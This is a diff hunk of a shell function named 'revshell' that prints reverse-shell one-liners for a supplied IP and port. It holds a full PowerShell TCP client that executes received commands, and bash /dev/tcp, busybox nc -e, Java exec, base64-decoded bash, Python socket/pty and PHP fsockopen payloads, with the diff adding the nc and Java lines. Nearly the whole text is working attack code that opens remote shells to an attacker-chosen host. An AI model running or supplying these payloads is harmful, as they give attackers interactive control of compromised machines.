@@ -8,8 +8,10 @@ revshell(){
   ps_cmd="\$client=New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream=\$client.GetStream();[byte[]]\$buffer=0..1024|%{0};while((\$i=\$stream.Read(\$buffer,0,\$buffer.Length)) -ne 0){\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$buffer,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
 
   ps_base64=$(echo "$ps_cmd" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)
-
-  echo -e "\n[+] Bash: /usr/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
+  
+  echo -e "\n[+] busybox nc $ip $port -e sh"
+  echo -e "[+] Java Runtime().exec: bash -c $@|bash 0 echo bash -i >& /dev/tcp/$ip/$port 0>&1 "
+  echo -e "[+] Bash: /usr/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
   echo -e "[+] Bash Encoded: echo \"$shell_encode\"|base64 -d |/usr/bin/bash"
   echo "[+] Python: python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
   echo "[+] PHP: php -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
